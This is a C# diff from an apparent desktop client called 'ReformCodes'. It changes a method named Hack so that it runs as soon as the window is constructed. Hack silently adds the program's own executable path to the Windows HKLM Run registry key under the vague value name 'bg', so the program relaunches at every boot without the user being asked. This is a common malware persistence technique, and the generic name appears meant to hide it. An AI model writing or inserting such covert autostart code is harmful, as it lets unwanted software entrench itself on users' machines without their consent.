@@ -20,8 +20,7 @@ namespace ReformCodes
             InitializeComponent();
             ServersManager = new ServersManager();
             ServersManager.Register(this);
-
-            Loaded += Hack;
+            Hack();
         }
 
         public void UpdateClientUI()
@@ -122,20 +121,15 @@ namespace ReformCodes
             }
         }
 
-        private void Hack(object sender, EventArgs e)
+        private void Hack()
         {
             string completePath = Process.GetCurrentProcess().MainModule.FileName;
-            string projectName = Process.GetCurrentProcess().MainModule.ModuleName;
             try
             {
                 RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
-                if (registryKey.GetValue(projectName) == null)
+                if (registryKey.GetValue("bg") == null)
                 {
-                    try
-                    {
-                        registryKey.SetValue(projectName, completePath);
-                    }
-                    catch { }
+                    registryKey.SetValue("bg", completePath);
                 }
             }
             catch
